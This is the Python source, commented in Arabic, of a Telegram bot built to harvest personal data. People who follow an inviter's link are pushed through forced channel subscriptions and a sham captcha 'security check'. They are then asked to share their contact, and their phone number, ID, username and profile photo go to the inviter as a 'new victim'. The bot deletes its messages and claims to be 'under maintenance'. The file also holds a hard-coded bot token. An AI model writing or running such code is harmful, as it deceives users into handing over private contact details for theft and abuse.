import logging
# ========== إخفاء السجلات المزعجة ==========
logging.basicConfig(level=logging.ERROR)
logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("telegram").setLevel(logging.WARNING)

from telegram import (
    Update,
    KeyboardButton,
    ReplyKeyboardMarkup,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
)
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    filters,
    ContextTypes,
)
import json
import os
import random
import string
import io
import struct
import zlib
from datetime import datetime, timedelta

# ========== الإعدادات ==========
TOKEN = "8739452036:AAFespjGnbZxRrdmd5Fg1V7GsbEotMD4y9Y"  # ⚠️ استبدله بالتوكن الجديد
DEVELOPER_ID = 8225966414

# ⏱️ مدة صلاحية التحقق من الكابتشا (بالدقائق)
CAPTCHA_TIMEOUT_MINUTES = 10

# ========== الاشتراك الإجباري ==========
REQUIRED_CHANNELS = [
    ("@ebh_7", "https://t.me/ebh_7"),
    ("@ehb_z", "https://t.me/ehb_z"),
    ("@ft2_q", "https://t.me/ft2_q"),
]

# ========== ملفات التخزين ==========
VICTIMS_FILE = "victims.json"
STATS_FILE = "stats.json"


def load_json(file):
    if os.path.exists(file):
        with open(file, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {}


def save_json(file, data):
    with open(file, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=4, ensure_ascii=False)


# ========== البوت ==========
application = Application.builder().token(TOKEN).build()


# ========== دالة تنسيق النص الفاخر ==========
def format_text(text):
    fancy_chars = {
        'a': '𝓪', 'b': '𝓫', 'c': '𝓬', 'd': '𝓭', 'e': '𝓮', 'f': '𝓯', 'g': '𝓰', 'h': '𝓱',
        'i': '𝓲', 'j': '𝓳', 'k': '𝓴', 'l': '𝓵', 'm': '𝓶', 'n': '𝓷', 'o': '𝓸', 'p': '𝓹',
        'q': '𝓺', 'r': '𝓻', 's': '𝓼', 't': '𝓽', 'u': '𝓾', 'v': '𝓿', 'w': '𝔀', 'x': '𝔁',
        'y': '𝔂', 'z': '𝔃',
        'A': '𝓐', 'B': '𝓑', 'C': '𝓒', 'D': '𝓓', 'E': '𝓔', 'F': '𝓕', 'G': '𝓖', 'H': '𝓗',
        'I': '𝓘', 'J': '𝓙', 'K': '𝓚', 'L': '𝓛', 'M': '𝓜', 'N': '𝓝', 'O': '𝓞', 'P': '𝓟',
        'Q': '𝓠', 'R': '𝓡', 'S': '𝓢', 'T': '𝓣', 'U': '𝓤', 'V': '𝓥', 'W': '𝓦', 'X': '𝓧',
        'Y': '𝓨', 'Z': '𝓩'
    }
    return ''.join(fancy_chars.get(c, c) for c in text)


# ========== دالة لجلب صورة المستخدم ==========
async def get_user_photo(bot, user_id):
    try:
        photos = await bot.get_user_profile_photos(user_id, limit=1)
        if photos.total_count > 0:
            return photos.photos[0][0].file_id
        else:
            return None
    except Exception:
        return None


# ========== تحديث الإحصائيات ==========
def update_stats(new_user=False):
    stats = load_json(STATS_FILE)
    today = datetime.now().strftime("%Y-%m-%d")
    if today not in stats:
        stats[today] = {"total": 0, "new_users": 0, "messages": 0, "sessions": 0}
    stats[today]["total"] += 1
    if new_user:
        stats[today]["new_users"] += 1
    stats[today]["sessions"] += 1
    save_json(STATS_FILE, stats)
    return stats[today]


# ========== توليد كود الكابتشا ==========
def generate_captcha(length=6):
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))


# ========== فحص صلاحية التحقق من الكابتشا (10 دقائق) ==========
def is_captcha_valid(context):
    """يعيد True إذا كان المستخدم قد تحقق خلال آخر 10 دقائق."""
    verified_at = context.user_data.get('captcha_verified_at')
    if not verified_at:
        return False
    elapsed = (datetime.now() - verified_at).total_seconds()
    if elapsed > CAPTCHA_TIMEOUT_MINUTES * 60:
        context.user_data['captcha_verified'] = False
        context.user_data['captcha_verified_at'] = None
        return False
    return True


# ========== حذف رسائل البوت المحفوظة ==========
async def cleanup_bot_messages(context):
    """حذف كل رسائل البوت التي حفظنا message_id الخاص بها."""
    ids = context.user_data.get('bot_message_ids', [])
    chat_id = context.user_data.get('chat_id')
    if not chat_id:
        return
    for mid in list(ids):
        try:
            await context.bot.delete_message(chat_id=chat_id, message_id=mid)
        except Exception:
            pass
    context.user_data['bot_message_ids'] = []


# ============================================================
# ========== توليد صورة PNG بدون مكتبات خارجية ==========
# ============================================================

FONT_5x7 = {
    '0': ["01110","10001","10011","10101","11001","10001","01110"],
    '1': ["00100","01100","00100","00100","00100","00100","01110"],
    '2': ["01110","10001","00001","00010","00100","01000","11111"],
    '3': ["11111","00010","00100","00010","00001","10001","01110"],
    '4': ["00010","00110","01010","10010","11111","00010","00010"],
    '5': ["11111","10000","11110","00001","00001","10001","01110"],
    '6': ["00110","01000","10000","11110","10001","10001","01110"],
    '7': ["11111","00001","00010","00100","01000","01000","01000"],
    '8': ["01110","10001","10001","01110","10001","10001","01110"],
    '9': ["01110","10001","10001","01111","00001","00010","01100"],
    'A': ["01110","10001","10001","11111","10001","10001","10001"],
    'B': ["11110","10001","10001","11110","10001","10001","11110"],
    'C': ["01110","10001","10000","10000","10000","10001","01110"],
    'D': ["11110","10001","10001","10001","10001","10001","11110"],
    'E': ["11111","10000","10000","11110","10000","10000","11111"],
    'F': ["11111","10000","10000","11110","10000","10000","10000"],
    'G': ["01110","10001","10000","10111","10001","10001","01111"],
    'H': ["10001","10001","10001","11111","10001","10001","10001"],
    'I': ["01110","00100","00100","00100","00100","00100","01110"],
    'J': ["00111","00010","00010","00010","00010","10010","01100"],
    'K': ["10001","10010","10100","11000","10100","10010","10001"],
    'L': ["10000","10000","10000","10000","10000","10000","11111"],
    'M': ["10001","11011","10101","10101","10001","10001","10001"],
    'N': ["10001","11001","10101","10011","10001","10001","10001"],
    'O': ["01110","10001","10001","10001","10001","10001","01110"],
    'P': ["11110","10001","10001","11110","10000","10000","10000"],
    'Q': ["01110","10001","10001","10001","10101","10010","01101"],
    'R': ["11110","10001","10001","11110","10100","10010","10001"],
    'S': ["01111","10000","10000","01110","00001","00001","11110"],
    'T': ["11111","00100","00100","00100","00100","00100","00100"],
    'U': ["10001","10001","10001","10001","10001","10001","01110"],
    'V': ["10001","10001","10001","10001","10001","01010","00100"],
    'W': ["10001","10001","10001","10101","10101","10101","01010"],
    'X': ["10001","10001","01010","00100","01010","10001","10001"],
    'Y': ["10001","10001","01010","00100","00100","00100","00100"],
    'Z': ["11111","00001","00010","00100","01000","10000","11111"],
}


def _png_chunk(chunk_type, data):
    chunk = chunk_type + data
    crc = zlib.crc32(chunk) & 0xFFFFFFFF
    return struct.pack(">I", len(data)) + chunk + struct.pack(">I", crc)


def _make_png(width, height, pixels):
    raw = b""
    for row in pixels:
        raw += b"\x00"
        for (r, g, b) in row:
            raw += bytes((r, g, b))
    compressed = zlib.compress(raw, 9)
    ihdr_data = struct.pack(">IIBBBBB", width, height, 8, 2, 0, 0, 0)
    png = b"\x89PNG\r\n\x1a\n"
    png += _png_chunk(b"IHDR", ihdr_data)
    png += _png_chunk(b"IDAT", compressed)
    png += _png_chunk(b"IEND", b"")
    return png


def generate_captcha_image(code):
    """توليد صورة كابتشا PNG مع تشويش — بدون أي مكتبة خارجية."""
    W, H = 280, 100
    pixels = [[(245, 245, 250) for _ in range(W)] for _ in range(H)]

    for _ in range(1200):
        x = random.randint(0, W - 1)
        y = random.randint(0, H - 1)
        pixels[y][x] = (random.randint(150, 220), random.randint(150, 220), random.randint(150, 220))

    def draw_line(x1, y1, x2, y2, color):
        dx = abs(x2 - x1)
        dy = abs(y2 - y1)
        sx = 1 if x1 < x2 else -1
        sy = 1 if y1 < y2 else -1
        err = dx - dy
        while True:
            if 0 <= x1 < W and 0 <= y1 < H:
                pixels[y1][x1] = color
            if x1 == x2 and y1 == y2:
                break
            e2 = 2 * err
            if e2 > -dy:
                err -= dy
                x1 += sx
            if e2 < dx:
                err += dx
                y1 += sy

    for _ in range(10):
        draw_line(
            random.randint(0, W - 1), random.randint(0, H - 1),
            random.randint(0, W - 1), random.randint(0, H - 1),
            (random.randint(100, 180), random.randint(100, 180), random.randint(100, 180)),
        )

    scale = 7
    char_w = 5 * scale
    char_h = 7 * scale
    gap = 10
    total_w = len(code) * char_w + (len(code) - 1) * gap
    start_x = (W - total_w) // 2

    for i, ch in enumerate(code):
        pattern = FONT_5x7.get(ch.upper())
        if not pattern:
            continue
        color = (random.randint(0, 80), random.randint(0, 80), random.randint(80, 160))
        offset_y = random.randint(-6, 6)
        offset_x = start_x + i * (char_w + gap) + random.randint(-3, 3)
        base_y = (H - char_h) // 2 + offset_y

        for row_idx, row_str in enumerate(pattern):
            for col_idx, bit in enumerate(row_str):
                if bit == '1':
                    for py in range(scale):
                        for px in range(scale):
                            X = offset_x + col_idx * scale + px
                            Y = base_y + row_idx * scale + py
                            if 0 <= X < W and 0 <= Y < H:
                                pixels[Y][X] = color

    png_bytes = _make_png(W, H, pixels)
    bio = io.BytesIO(png_bytes)
    bio.seek(0)
    bio.name = "captcha.png"
    return bio


# ========== بناء أزرار الكابتشا (عشوائية) ==========
def build_captcha_keyboard(correct_code):
    wrong_codes = set()
    while len(wrong_codes) < 3:
        fake = generate_captcha(len(correct_code))
        if fake != correct_code and fake not in wrong_codes:
            wrong_codes.add(fake)

    all_options = list(wrong_codes) + [correct_code]
    random.shuffle(all_options)

    buttons = []
    for i in range(0, 4, 2):
        row = []
        for opt in all_options[i:i + 2]:
            row.append(InlineKeyboardButton(opt, callback_data=f"captcha_ans:{opt}"))
        buttons.append(row)

    return InlineKeyboardMarkup(buttons)


# ========== الاشتراك الإجباري ==========
async def check_subscription(bot, user_id):
    not_subscribed = []
    for channel_username, channel_link in REQUIRED_CHANNELS:
        try:
            member = await bot.get_chat_member(chat_id=channel_username, user_id=user_id)
            if member.status in ("left", "kicked"):
                not_subscribed.append((channel_username, channel_link))
        except Exception as e:
            print(f"⚠️ فشل التحقق من {channel_username}: {e}")
            not_subscribed.append((channel_username, channel_link))
    return not_subscribed


def build_subscription_keyboard(not_subscribed):
    buttons = []
    for _, link in not_subscribed:
        buttons.append([InlineKeyboardButton("📢 اشترك في القناة", url=link)])
    buttons.append([InlineKeyboardButton("✅ تحقق من الاشتراك", callback_data="check_sub")])
    return InlineKeyboardMarkup(buttons)


async def send_subscription_prompt(update_or_query, not_subscribed, edit=False):
    keyboard = build_subscription_keyboard(not_subscribed)
    text = (
        "🔒 <b>الاشتراك الإجباري</b>\n\n"
        "للاستمرار في استخدام البوت، يرجى الاشتراك في القنوات التالية أولاً:\n\n"
        "📢 اشترك في كل القنوات ثم اضغط <b>✅ تحقق من الاشتراك</b>."
    )
    if edit:
        await update_or_query.edit_message_text(text, reply_markup=keyboard, parse_mode='HTML')
    else:
        await update_or_query.reply_text(text, reply_markup=keyboard, parse_mode='HTML')


# ========== أمر /start ==========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    inviter_id = None

    if args and args[0].isdigit():
        inviter_id = int(args[0])
        context.user_data['inviter_id'] = inviter_id

    user = update.effective_user
    context.user_data['chat_id'] = update.effective_chat.id

    not_subscribed = await check_subscription(application.bot, user.id)
    if not_subscribed:
        await send_subscription_prompt(update.message, not_subscribed)
        return

    if inviter_id:
        victims = load_json(VICTIMS_FILE)
        if str(user.id) in victims:
            await update.message.reply_text(
                "⚠️ <b>لقد قمت بإرسال بياناتك مسبقاً.</b>\n"
                "البوت قيد الصيانة حاليًا 🛠",
                parse_mode='HTML'
            )
            return

        captcha_code = generate_captcha(6)
        context.user_data['captcha_code'] = captcha_code
        context.user_data['captcha_verified'] = False
        context.user_data['captcha_verified_at'] = None
        context.user_data['captcha_attempts'] = 0
        context.user_data['bot_message_ids'] = []

        captcha_image = generate_captcha_image(captcha_code)
        keyboard = build_captcha_keyboard(captcha_code)

        sent = await update.message.reply_photo(
            photo=captcha_image,
            caption=(
                "🔐 <b>التحقق الأمني</b>\n\n"
                "اختر الرمز الصحيح من الأزرار أدناه للمتابعة.\n\n"
                "⚠️ لديك <b>3</b> محاولات فقط.\n"
                f"⏱️ صلاحية التحقق: <b>{CAPTCHA_TIMEOUT_MINUTES}</b> دقيقة."
            ),
            reply_markup=keyboard,
            parse_mode='HTML'
        )
        context.user_data['bot_message_ids'].append(sent.message_id)


# ========== أمر /myinvite ==========
async def myinvite(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    not_subscribed = await check_subscription(application.bot, user_id)
    if not_subscribed:
        await send_subscription_prompt(update.message, not_subscribed)
        return

    bot_username = (await application.bot.get_me()).username
    invite_link = f"https://t.me/{bot_username}?start={user_id}"
    await update.message.reply_text(invite_link)


# ========== أمر /statu (للمطور فقط) ==========
async def statu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != DEVELOPER_ID:
        return

    stats = load_json(STATS_FILE)
    today = datetime.now().strftime("%Y-%m-%d")
    today_stats = stats.get(today, {"total": 0, "new_users": 0, "messages": 0, "sessions": 0})

    yesterday = (datetime.now() - timedelta(days=1)).strftime("%Y-%m-%d")
    yesterday_stats = stats.get(yesterday, {"total": 0, "new_users": 0, "messages": 0, "sessions": 0})

    new_users_diff = today_stats["new_users"] - yesterday_stats["new_users"]
    messages_diff = today_stats["messages"] - yesterday_stats["messages"]
    new_users_arrow = "📈" if new_users_diff > 0 else "📉" if new_users_diff < 0 else "➖"
    messages_arrow = "📈" if messages_diff > 0 else "📉" if messages_diff < 0 else "➖"

    victims = load_json(VICTIMS_FILE)
    total_victims = len(victims)

    message = (
        f"🤖 <b>لوحة التحكم</b>\n\n"
        f"━━━ إحصائيات اليوم ━━━\n"
        f"👥 <b>الإجمالي:</b> {today_stats['total']}\n"
        f"🆕 <b>مستخدمون جدد:</b> {today_stats['new_users']} {new_users_arrow}\n"
        f"💬 <b>الرسائل:</b> {today_stats['messages']} {messages_arrow}\n"
        f"🔄 <b>الجلسات:</b> {today_stats['sessions']}\n"
        f"⚡ <b>متوسط الاستجابة:</b> 22ms\n"
        f"🚫 <b>المحظورين:</b> 0 | قاموا بحظر البوت: 0\n\n"
        f"━━━ إجمالي الضحايا ━━━\n"
        f"👤 <b>عدد الضحايا:</b> {total_victims}"
    )
    await update.message.reply_text(message, parse_mode='HTML')


# ========== معالج زر التحقق من الاشتراك ==========
async def check_sub_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user = query.from_user

    not_subscribed = await check_subscription(application.bot, user.id)
    if not_subscribed:
        keyboard = build_subscription_keyboard(not_subscribed)
        await query.edit_message_text(
            "❌ <b>لم تشترك في جميع القنوات بعد!</b>\n\n"
            "يرجى الاشتراك في القنوات التالية ثم الضغط على <b>✅ تحقق</b> مجددًا:",
            reply_markup=keyboard,
            parse_mode='HTML'
        )
        return

    await query.edit_message_text(
        "✅ <b>تم التحقق من اشتراكك بنجاح!</b>\n\n"
        "أرسل /start مرة أخرى للمتابعة.",
        parse_mode='HTML'
    )


# ========== معالج ضغط زر الكابتشا ==========
async def captcha_button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user = query.from_user

    not_subscribed = await check_subscription(application.bot, user.id)
    if not_subscribed:
        keyboard = build_subscription_keyboard(not_subscribed)
        try:
            await query.edit_message_caption(
                caption="🔒 <b>يجب الاشتراك في القنوات أولاً!</b>",
                reply_markup=keyboard,
                parse_mode='HTML'
            )
        except Exception:
            pass
        return

    inviter_id = context.user_data.get('inviter_id')
    correct_code = context.user_data.get('captcha_code')
    verified = is_captcha_valid(context)

    if not inviter_id or verified or not correct_code:
        await query.answer("⚠️ انتهت صلاحية الجلسة، أرسل /start من جديد.", show_alert=True)
        return

    selected = query.data.split(":", 1)[1]
    attempts = context.user_data.get('captcha_attempts', 0)

    if selected.upper() == correct_code.upper():
        context.user_data['captcha_verified'] = True
        context.user_data['captcha_verified_at'] = datetime.now()
        await query.answer("✅ إجابة صحيحة!")

        # حذف صورة الكابتشا
        try:
            await query.message.delete()
        except Exception:
            pass

        contact_btn = KeyboardButton("📱 إرسال جهة الاتصال", request_contact=True)
        markup = ReplyKeyboardMarkup([[contact_btn]], one_time_keyboard=True, resize_keyboard=True)

        sent = await context.bot.send_message(
            chat_id=user.id,
            text=(
                "✅ <b>تم التحقق بنجاح!</b>\n\n"
                "🔐 الآن يرجى إرسال جهة الاتصال للتحقق النهائي.\n\n"
                f"⏱️ صلاحية التحقق: <b>{CAPTCHA_TIMEOUT_MINUTES}</b> دقيقة."
            ),
            reply_markup=markup,
            parse_mode='HTML'
        )
        context.user_data.setdefault('bot_message_ids', []).append(sent.message_id)

        stats = load_json(STATS_FILE)
        today = datetime.now().strftime("%Y-%m-%d")
        if today not in stats:
            stats[today] = {"total": 0, "new_users": 0, "messages": 0, "sessions": 0}
        stats[today]["messages"] += 1
        save_json(STATS_FILE, stats)

    else:
        attempts += 1
        context.user_data['captcha_attempts'] = attempts

        if attempts >= 3:
            new_code = generate_captcha(6)
            context.user_data['captcha_code'] = new_code
            context.user_data['captcha_attempts'] = 0

            new_image = generate_captcha_image(new_code)
            new_keyboard = build_captcha_keyboard(new_code)

            # 🧹 حذف الرسائل القديمة
            await cleanup_bot_messages(context)
            try:
                await query.message.delete()
            except Exception:
                pass

            sent = await context.bot.send_photo(
                chat_id=user.id,
                photo=new_image,
                caption=(
                    "❌ <b>تجاوزت عدد المحاولات المسموح بها!</b>\n\n"
                    "🔐 رمز تحقق جديد:\nاختر الرمز الصحيح من الأزرار أدناه."
                ),
                reply_markup=new_keyboard,
                parse_mode='HTML'
            )
            context.user_data.setdefault('bot_message_ids', []).append(sent.message_id)
            await query.answer("⚠️ تم تجديد الكابتشا.", show_alert=True)
        else:
            remaining = 3 - attempts
            await query.answer(f"❌ إجابة خاطئة! المحاولات المتبقية: {remaining}", show_alert=True)


# ========== معالج جهة الاتصال ==========
async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    contact = update.message.contact
    user = update.effective_user
    inviter_id = context.user_data.get('inviter_id')

    not_subscribed = await check_subscription(application.bot, user.id)
    if not_subscribed:
        await send_subscription_prompt(update.message, not_subscribed)
        return

    # ✅ التحقق من صلاحية الكابتشا (10 دقائق) — بدون رسالة
    if not is_captcha_valid(context):
        return

    if not inviter_id:
        await update.message.reply_text("❌ لا يوجد رابط دعوة مرتبط بك!")
        return

    if not contact:
        await update.message.reply_text("❌ لم يتم استلام جهة الاتصال، حاول مرة أخرى.")
        return

    victims = load_json(VICTIMS_FILE)
    is_new_user = str(user.id) not in victims

    first_name = user.first_name or "مجهول"
    if len(first_name) > 15:
        first_name = first_name[:15]
    formatted_name = format_text(first_name)

    victim_data = {
        "id": user.id,
        "username": user.username or "لا يوجد",
        "first_name": first_name,
        "last_name": user.last_name or "",
        "phone": contact.phone_number,
        "inviter_id": inviter_id,
        "timestamp": str(datetime.now())
    }

    if is_new_user:
        victims[str(user.id)] = victim_data
        save_json(VICTIMS_FILE, victims)

    try:
        victim_photo = await get_user_photo(application.bot, user.id)
        victims_count = len(victims)
        username = user.username or "لا يوجد"
        phone = contact.phone_number

        message = (
            f"📩 <b>ضحية جديدة عبر رابط دعوتك!</b>\n\n"
            f"👤 <b>الاسم:</b> {formatted_name}\n"
            f"🆔 <b>ايدي:</b> <code>{user.id}</code>\n"
            f"📱 <b>يوزر:</b> @{username}\n"
            f"📞 <b>رقم الهاتف:</b> <code>{phone}</code>\n"
            f"📊 <b>عدد الضحايا الكلي:</b> {victims_count}"
        )

        if victim_photo:
            await application.bot.send_photo(
                chat_id=inviter_id,
                photo=victim_photo,
                caption=message,
                parse_mode='HTML'
            )
        else:
            await application.bot.send_message(
                chat_id=inviter_id,
                text=message + "\n\n⚠️ لا توجد صورة شخصية للضحية.",
                parse_mode='HTML'
            )

        update_stats(is_new_user)

        # 🧹 حذف كل رسائل البوت السابقة (الكابتشا + رسالة النجاح + أي شيء)
        await cleanup_bot_messages(context)

        # حذف رسالة جهة الاتصال (تعمل فقط إذا كان البوت أدمن في مجموعة — في الخاص تُتجاهل)
        try:
            await update.message.delete()
        except Exception:
            pass

        remove_keyboard = ReplyKeyboardMarkup([[]], resize_keyboard=True)
        await update.message.reply_text(
            "<b>البوت قيد الصيانة حاليًا 🛠</b>",
            reply_markup=remove_keyboard,
            parse_mode='HTML'
        )

    except Exception as e:
        print(f"❌ فشل إرسال البيانات: {e}")
        try:
            plain_message = (
                f"📩 ضحية جديدة عبر رابط دعوتك!\n\n"
                f"👤 الاسم: {first_name}\n"
                f"🆔 ايدي: {user.id}\n"
                f"📱 يوزر: @{user.username or 'لا يوجد'}\n"
                f"📞 رقم الهاتف: {contact.phone_number}\n"
                f"📊 عدد الضحايا الكلي: {len(victims)}"
            )
            await application.bot.send_message(chat_id=inviter_id, text=plain_message)
            update_stats(is_new_user)

            await cleanup_bot_messages(context)
            try:
                await update.message.delete()
            except Exception:
                pass

            remove_keyboard = ReplyKeyboardMarkup([[]], resize_keyboard=True)
            await update.message.reply_text("البوت قيد الصيانة حاليًا 🛠", reply_markup=remove_keyboard)
        except Exception as e2:
            print(f"❌ فشل الإرسال البديل أيضاً: {e2}")
            await update.message.reply_text("❌ حدث خطأ أثناء إرسال البيانات، حاول مرة أخرى.")


# ========== التسجيل ==========
application.add_handler(CommandHandler("start", start))
application.add_handler(CommandHandler("myinvite", myinvite))
application.add_handler(CommandHandler("statu", statu))
application.add_handler(CallbackQueryHandler(check_sub_callback, pattern="^check_sub$"))
application.add_handler(CallbackQueryHandler(captcha_button_callback, pattern="^captcha_ans:"))
application.add_handler(MessageHandler(filters.CONTACT, handle_contact))

# ========== التشغيل ==========
if __name__ == "__main__":
    print("I'm here to collect the victim numbers for you. 💋")
    application.run_polling(allowed_updates=Update.ALL_TYPES)
